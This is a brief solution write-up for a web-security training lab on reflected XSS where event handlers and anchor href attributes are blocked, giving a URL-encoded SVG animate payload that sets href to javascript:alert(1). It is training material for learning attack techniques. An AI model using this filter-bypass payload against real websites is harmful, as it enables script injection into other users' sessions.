# Lab 8: Reflected XSS with event handlers and href attributes blocked

This lab contains a reflected XSS vulnerability with some whitelisted tags, but **all events and anchor `href` attributes are blocked**.

---

### 🎯 **Goal**

Perform a cross-site scripting attack that injects a vector which, when clicked, calls the `alert` function.

> Important:
> 
> 
> You need to label your vector with the word **"Click"** to induce the simulated lab user to click it. For example:
> 
> ```jsx
> <a href="">Click me</a>
> ```
> 

---

### 🛠️ **Solution**

1️⃣ Visit the following URL, replacing `YOUR-LAB-ID` with your lab ID:

```
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```

---

### 🎥 **Community solutions**

▶️ [Watch video walkthrough](https://youtu.be/SGi_IkgyKew)

---

If you'd like, I can help you create a visual diagram or a step-by-step guide for your team!